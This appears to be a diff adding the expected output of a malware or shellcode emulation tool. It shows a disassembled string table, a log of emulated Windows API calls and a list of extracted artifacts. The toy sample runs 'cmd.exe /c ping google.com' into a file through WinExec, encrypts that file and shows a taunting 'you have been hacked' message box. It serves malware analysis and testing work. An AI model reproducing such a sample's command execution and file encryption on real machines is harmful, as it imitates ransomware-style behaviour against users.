+[32;1m0x750[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x751[0m [37mSTARTUPINFO[35;1m ; string[0m		        [31;1m53 54 41 52 54 55 50 49 ...[0m[36;1m STARTUPINFO[0m
+[32;1m0x75c[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x75d[0m [37mExitProcess[35;1m ; string[0m		        [31;1m45 78 69 74 50 72 6f 63 ...[0m[36;1m ExitProcess[0m
+[32;1m0x768[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[0m
+**************************
+     Emulation
+**************************
+
+
+************* APIs *************
+
+0x123123 WinExec(LPCSTR lpCmdLine, UINT uCmdShow)
+	LPCSTR lpCmdLine: cmd.exe /c ping google.com > C:\result.txt
+	UINT uCmdShow: 0x5
+	Return: 0x20
+
+0x321321 EncyptFileA(LPCSTR lpFileName)
+	LPCSTR lpFileName: C:\result.txt
+	Return: 0x20
+
+0x1337c0de LoadLibraryA(LPCTSTR lpLibFileName)
+	LPCTSTR lpLibFileName: user32.dll
+	Return: 0x45664c88
+
+0xdeadc0de MessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)
+	HWND hWnd: 0x987987
+	LPCSTR lpText: You have been hacked by an elite haxor. Your IP address is now stored in C:\result.txt but it is encrypted :)cmd.exe /c ping google.com > C:\result.txt
+	LPCSTR lpCaption: You have been hacked by an elite haxor. Your IP address is now stored in C:\result.txt but it is encrypted :)cmd.exe /c ping google.com > C:\result.txt
+	UINT uType: 0x0
+	Return: 0x20
+
+
+************* DLLs *************
+DLLs                   kernel32,advapi32,user32
+
+************* Artifacts *************
+Artifacts              
+c:\result.txt
+cmd.exe
+google.com
+result.txt
+user32.dll
+www.msn.com
+http://74.32.123.2:8080
+c:\windows\system32\ipconfig.exe
+
+Web artifacts          
+www.msn.com
+http://74.32.123.2:8080
+google.com
+
+File artifacts         
+c:\result.txt
+cmd.exe
+result.txt
+
+Executable artifacts   
+c:\windows\system32\ipconfig.exe
+cmd.exe
+
+
